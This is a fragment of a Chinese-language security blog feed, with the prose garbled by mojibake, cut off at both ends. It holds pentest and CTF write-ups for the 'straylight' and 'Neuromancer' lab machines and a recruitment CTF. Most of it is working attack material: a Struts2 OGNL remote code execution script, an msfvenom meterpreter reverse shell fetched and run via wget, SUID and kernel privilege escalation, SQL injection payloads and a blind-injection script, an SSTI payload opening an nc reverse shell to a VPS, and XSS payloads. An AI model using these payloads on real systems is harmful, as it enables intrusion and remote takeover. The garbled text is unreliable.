id="suidææƒ">suidææƒ</h3><p>å…·ä½“å¯ä»¥å»çœ‹è¿™ç¯‡æ–‡ç« :<a href="https://www.anquanke.com/post/id/86979" title="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a> ç®€è€Œè¨€ä¹‹</p><blockquote><p>SUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦ç»™LinuxäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®è¿™ç§æƒé™å‘¢ï¼Ÿå…¶å®åŸå› æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ï¼Œç¨‹åºpingéœ€è¦rootæƒé™æ‰èƒ½æ‰“å¼€ç½‘ç»œå¥—æ¥å­—ï¼Œä½†æ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·é€šå¸¸éƒ½æ˜¯ç”±æ™®é€šç”¨æˆ·ï¼Œæ¥éªŒè¯ä¸å…¶ä»–ä¸»æœºçš„è¿é€šæ€§ã€‚ ä½†æ˜¯ï¼Œå¦‚æœæŸäº›ç°æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå®ç”¨ç¨‹åºå…·æœ‰SUIDæƒé™çš„è¯ï¼Œå°±å¯ä»¥åœ¨æ‰§è¡Œæ—¶å°†æƒé™æå‡ä¸ºrootã€‚</p></blockquote><p>å¯ä»¥ç”¨äºææƒçš„åŒ…æ‹¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap</span><br><span class="line">Vim</span><br><span class="line">find</span><br><span class="line">Bash</span><br><span class="line">More</span><br><span class="line">Less</span><br><span class="line">Nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾æœ‰å“ªäº›å…·æœ‰suidæƒé™ä½è€Œä¸”å±äºrootçš„æ–‡ä»¶å¯ä»¥ç”¨ä¸‹é¢çš„ä¸€äº›å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>é¶æœºä¸Šé¢è·‘ä¸€ä¸‹,å¾—åˆ°ä¸‹é¢ä¸€äº›æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">&lt;ing-bolo$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªscreen-4.5.0,searchsploitæœä¸€ä¸‹ <a href="/images/2018/10/2018-10-01-03-07-15å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-03-07-15å±å¹•æˆªå›¾.png" /></a> æ‰¾åˆ°å¯ä»¥ææƒçš„æ¼æ´äº†,èšå‰‘ä¼ ä¸Šå»,ä¸è¿‡è¿è¡Œä¼šå‡ºé”™,æˆ‘ä»¬æ‰‹åŠ¨è·‘ä¸€ä¸‹,ç„¶åæ‹¿åˆ°root <a href="/images/2018/10/2018-10-01-03-33-00å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-03-33-00å±å¹•æˆªå›¾.png" /></a> æ‹¿åˆ°flagå’Œrootä¸‹é¢çš„note <a href="/images/2018/10/2018-10-01-12-33-39å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-33-39å±å¹•æˆªå›¾.png" /></a> ä¸ºäº†æ–¹ä¾¿,æˆ‘ç»™straylightè£…äº†ä¸ªssh,åŠ äº†ä¸ªblacsheepç”¨æˆ·,è¿™æ ·å°±å¯ä»¥æœ‰ä¸€ä¸ªå®Œæ•´çš„shelläº†</p><h2 id="neuromancer">Neuromancer</h2><h3 id="æ‰¾ipå’Œç«¯å£">æ‰¾ipå’Œç«¯å£</h3><p>è¿™ä¸ªæ¶‰åŠåˆ°é¶æœºæ‰¾ipå’Œç«¯å£,æœ€å®¹æ˜“æƒ³åˆ°çš„è‚¯å®šæ˜¯ç›´æ¥å»ä¸‹è½½ä¸€ä¸ªnmap,ç„¶åç¼–è¯‘ä¸€ä¸‹æ‰«,ä¸è¿‡è¿™é‡Œå­¦åˆ°ä¸€äº›æ–°çŸ¥è¯†,å¯ä»¥ç”¨shellçš„å¾ªç¯æ¥æ‰«ipå’Œç«¯å£ æ‰¾ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 192.168.29.<span class="variable">$p</span>  2&gt;&amp;1 ;<span class="keyword">done</span>  grep <span class="string">&quot;bytes from&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-33-00å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-33-00å±å¹•æˆªå›¾.png" /></a> æ‰¾åˆ°é¶æœºip:192.168.29.4 ç„¶åæ‰«å®ƒçš„ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535);<span class="keyword">do</span> nc -nvz -w 1 192.168.29.4 <span class="variable">$p</span> 2&gt;&amp;1 ;<span class="keyword">done</span>  grep -v <span class="string">&quot;refused&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-32-18å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-32-18å±å¹•æˆªå›¾.png" /></a></p><h3 id="ç«¯å£è½¬å‘å’Œgetshell">ç«¯å£è½¬å‘å’Œgetshell</h3><p>straylighté¶æœºä¸Šé¢è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:8009,fork tcp:192.168.29.4:8009&amp;</span></span><br><span class="line">[1] 3740</span><br><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:8080,fork tcp:192.168.29.4:8080&amp;</span></span><br><span class="line">[2] 3765</span><br><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:34483,fork tcp:192.168.29.4:34483&amp;</span></span><br><span class="line">[3] 3803</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-41-02å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-41-02å±å¹•æˆªå›¾.png" /></a> ç„¶åå»8080ç«¯å£,å‘ç°æ˜¯ä¸ªtomcatçš„manageé¡µé¢,å°è¯•çˆ†ç ´ä¸€ä¸‹,å¤±è´¥äº† <a href="/images/2018/10/2018-10-01-12-45-58å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-45-58å±å¹•æˆªå›¾.png" /></a> æƒ³åˆ°ä¹‹å‰noteé‡Œé¢çš„é‚£ä¸ªè·¯å¾„,è®¿é—®ä¸€ä¸‹ <a href="/images/2018/10/2018-10-01-12-46-53å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-46-53å±å¹•æˆªå›¾.png" /></a> æ‰¾ä¸€ä¸‹è¿™ä¸ªæœ‰æ²¡æœ‰æ¼æ´ <a href="/images/2018/10/2018-10-01-12-48-08å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-12-48-08å±å¹•æˆªå›¾.png" /></a> å‘ç°æœ‰ä¸ªä»£ç æ‰§è¡Œçš„æ¼æ´,ç”¨ä¸€ä¸‹,ä½†æ˜¯å‘ç°å¹¶ä¸èƒ½æ‰§è¡Œ,è¿™é‡Œæœ‰äººæ¢æˆäº†bashçš„ä»£ç ,åˆ©ç”¨curlæ¢æ‰äº†requests,å¯ä»¥æ‰§è¡Œ,è´´ä¸ªä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LHOST=192.168.30.128</span><br><span class="line">LPORT=4321</span><br><span class="line">RHOST=192.168.30.129</span><br><span class="line">RPORT=8080</span><br><span class="line">TARGETURI=struts2_2.3.15.1-showcase/integration</span><br><span class="line">URL=http://<span class="variable">$RHOST</span>:<span class="variable">$RPORT</span>/<span class="variable">$TARGETURI</span>/saveGangster.action</span><br><span class="line">CMD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>%&#123;&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#_memberAccess?(#_memberAccess=#dm):&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil.getExcludedPackageNames().clear()).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil.getExcludedClasses().clear()).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#context.setMemberAccess(#dm)))).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(@java.lang.Runtime@getRuntime().exec(&#x27;<span class="variable">$CMD</span>&#x27;))&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="subst">$(basename $0)</span> [COMMAND]&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">  usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -H <span class="string">&quot;Referer: http://<span class="variable">$RHOST</span>:<span class="variable">$RPORT</span>/<span class="variable">$TARGETURI</span>/editGangster&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;name=<span class="variable">$PAYLOAD</span>&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;age=20&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;__checkbox_bustedBefore=true&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;description=1&quot;</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     <span class="variable">$URL</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡ncç‰ˆæœ¬ä¸æ”¯æŒ-e,è€Œä¸”ç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨<code>java.lang.Runtime</code>æ¥æ‰§è¡Œå‘½ä»¤,æ‰€ä»¥ç®¡é“ç¬¦ä¹Ÿä¸èƒ½ç”¨.. <a href="/images/2018/10/2018-10-01-13-29-25å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-13-29-25å±å¹•æˆªå›¾.png" /></a> é‚£ä¹ˆæˆ‘ä»¬å†åšä¸€ä¸ªç«¯å£è½¬å‘,æŠŠè®¿é—®192.168.1.101çš„4444çš„æµé‡è½¬åˆ°æœ¬æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:4444,fork tcp:192.168.1.105:4444 &amp;</span></span><br><span class="line">[4] 5820</span><br></pre></td></tr></table></figure><p>ç„¶åmsfvenomç”Ÿæˆæœ¨é©¬,scpä¼ åˆ°straylight</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.29.3 lport=4444 -f elf -o shell</span><br><span class="line"></span><br><span class="line">scp  ./shell  blacsheep@192.168.1.101:/tmp/</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-13-25-43å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-13-25-43å±å¹•æˆªå›¾.png" /></a> æŠŠshellæ”¾åˆ°webç›®å½•,ç„¶åè®©Neuromancerå»wgetä¸‹ä¸‹æ¥æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./exploit.sh <span class="string">&quot;wget -O /tmp/shell 192.168.29.3/shell&quot;</span></span><br><span class="line">./exploit.sh <span class="string">&quot;chmod 777 /tmp/shell&quot;</span></span><br><span class="line">./exploit.sh <span class="string">&quot;sh -c /tmp/shell&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-13-47-40å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-13-47-40å±å¹•æˆªå›¾.png" /></a> ç„¶åæ‹¿åˆ°meterpreter <a href="/images/2018/10/2018-10-01-13-49-42å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-13-49-42å±å¹•æˆªå›¾.png" /></a></p><h3 id="ææƒ">ææƒ</h3><p>å…ˆå†™ä¸ªssh-keyæ–¹ä¾¿è¿æ¥ <a href="/images/2018/10/2018-10-01-14-13-53å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-13-53å±å¹•æˆªå›¾.png" /></a> ç„¶åæŠŠè¿™ä¸ªå†™åˆ°ç”¨æˆ·ç›®å½•çš„.ssh/authorized_keys <a href="/images/2018/10/2018-10-01-14-15-43å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-15-43å±å¹•æˆªå›¾.png" /></a> ç„¶åssh -i è¿æ¥ <a href="/images/2018/10/2018-10-01-14-16-12å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-16-12å±å¹•æˆªå›¾.png" /></a> æŸ¥çœ‹å†…æ ¸ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux neuromancer 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>searchsploitæ‰¾ä¸€ä¸‹,åˆšåˆšå¥½æœ‰ä¸ªç‰ˆæœ¬ä¸€è‡´çš„ <a href="/images/2018/10/2018-10-01-14-25-29å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-25-29å±å¹•æˆªå›¾.png" /></a> ç›®æ ‡æœºæ²¡æœ‰gcc,æœ¬åœ°ç¼–è¯‘ä¼ ä¸Šå» <a href="/images/2018/10/2018-10-01-14-23-58å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-23-58å±å¹•æˆªå›¾.png" /></a> ç›®æ ‡æœºè¿è¡Œ,æ‹¿åˆ°shell <a href="/images/2018/10/2018-10-01-14-27-21å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-01-14-27-21å±å¹•æˆªå›¾.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cnss2018æ‹›æ–°wp(web)</title>
      <link href="/2018/09/21/cnss2018%E6%8B%9B%E6%96%B0wpweb/"/>
      <url>/2018/09/21/cnss2018%E6%8B%9B%E6%96%B0wpweb/</url>
      
        <content type="html"><![CDATA[<p>ç®€å•è®°å½•ä¸€ä¸‹å§ é¦–å…ˆå†™ä¸‹è‡ªå·±å‡ºçš„ä¸‰é“é¢˜å§</p><h2 id="ez-sql">ez sql</h2><p>ä¸‡èƒ½å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¸å·:123&#x27;or&#x27;1&#x27;=&#x27;1&#x27;#</span><br><span class="line">å¯†ç éšæ„</span><br></pre></td></tr></table></figure><h2 id="normal-sql">normal sql</h2><p>æ— è¿‡æ»¤æŠ¥é”™æ³¨å…¥,å¯ä»¥sqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username -D cnss_ctf --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username -D cnss_ctf -T fl4g_1s_Here --dump</span><br></pre></td></tr></table></figure><p>æˆ–è€…è‡ªå·±å†™payload,ä¹Ÿä¸éš¾</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and extractvalue(1,concat(0x3a,(select fl4444ag from fl4g_1s_Here)))#</span></span><br></pre></td></tr></table></figure><h2 id="hard-sql">hard sql</h2><p>ç®€å•åœ°åŠ äº†ç‚¹è¿‡æ»¤ ç„¶åå°±æ˜¯æ•°æ®åº“çš„userè¡¨é‡Œé¢æ˜¯ç©ºçš„,æ‰€ä»¥sleep,boolä»€ä¹ˆçš„éƒ½æ²¡æœ‰ç”¨,æ£€æµ‹çš„è¯çš„ç”¨unionæ¥æ£€æµ‹,ç„¶åå°±æ˜¯ç©ºæ ¼å’Œæ³¨é‡Šéƒ½è¢«æˆ‘è¿‡æ»¤äº†,ç”¨æ‹¬å·ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¸å·:admin&#x27;union(select(1),2,md5(1))#</span><br><span class="line">å¯†ç :1</span><br></pre></td></tr></table></figure><p>ç„¶åæ•´ä¸ªçš„è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://132.232.92.163:6732/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> asc <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment"># select query here </span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨</span></span><br><span class="line">        <span class="comment"># select_query = &quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># select_query = &quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c34675f31735f48657265)&quot;</span></span><br><span class="line">        <span class="comment"># æ‹¿flag</span></span><br><span class="line">        select_query = <span class="string">&quot;select(fl444ag)from(fl4g_1s_Here)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload here</span></span><br><span class="line">        payload = <span class="string">&quot;ord(mid((&#123;select_query&#125;),&#123;index&#125;,1))=&#123;asc&#125;&quot;</span>.<span class="built_in">format</span>(select_query = select_query, index = index,</span><br><span class="line">                                                                      asc = asc)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># post data</span></span><br><span class="line">        username = <span class="string">&quot;admin&#x27;union(select(1),2,md5(if(&#123;payload&#125;,1,0)))#&quot;</span>.<span class="built_in">format</span>(payload = payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span> : username, <span class="string">&#x27;password&#x27;</span> : password&#125;</span><br><span class="line">        r = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;union&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(asc), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="blacsheeps-love">blacsheep's love</h2><p>ssti,è¿›å»ä¹‹åé‡å®šå‘ urlæ˜¯http://132.232.92.163:6733/?name=blacsheep æ”¹ä¸€ä¸‹åé¢çš„blacsheepä¸º<code>&#123;&#123;7*7&#125;&#125;</code> å‘ç°ç»“æœå˜æˆäº†49,ç„¶åæ³¨æ„ä¸€ä¸‹è¿‡æ»¤äº†classå…³é”®å­—,éœ€è¦ç®€å•ç»•è¿‡ä¸€ä¸‹ ç»•è¿‡çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__.values()[12].__getattribute__(&#x27;s&#x27;+&#x27;ystem&#x27;)(cmd_here)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å…ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://132.232.92.163:6733/?name=&#123;&#123;request[%22__clas%22+%22s__%22].__bases__[0].__bases__[0].__bases__[0][%22__subcla%22+%22sses__%22]()[59].__init__.__getattribute__(%27func_global%27+%27s%27)[%27linecache%27].__dict__.values()[12].__getattribute__(%27s%27+%27ystem%27)(%27nc%20your_vps%20your_port%20%20/bin/bash%27)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åvpsä¸Šé¢æ”¶åˆ°ncè¿æ¥ ncä¸Šé¢å¼¹ä¸€ä¸ªshell,æ‹¿åˆ°flag <a href="/images/2018/09/2018-09-21-17-06-14å±å¹•æˆªå›¾.png"><img src="/images/2018/09/2018-09-21-17-06-14å±å¹•æˆªå›¾.png" /></a></p><h2 id="ä½ ä»¬çš„è€å©†æ²¡æœ‰äº†">ä½ ä»¬çš„è€å©†æ²¡æœ‰äº†</h2><p>ç®€å•çš„xss æäº¤ä¸€ä¸ªaaaaaaaa å¾—åˆ°ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;images/aaaaaaaa.png&quot; &gt;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä¹‹åå‘ç°å°–æ‹¬å·è¿‡æ»¤äº† é‚£æäº¤ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onerror=alert(/xss/) &quot;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><h2 id="babyblog">BabyBlog</h2><p>è¿›å»çœ‹äº†ä¸‹,ä¸€ä¸ªå‘è¡¨æ–‡ç« çš„é¡µé¢,ä¸€ä¸ªæäº¤æ–‡ç« çš„é¡µé¢ ç®€å•æµ‹è¯•ä¸€ä¸‹,è¿‡æ»¤äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬æ–¹ä¾¿æäº¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span 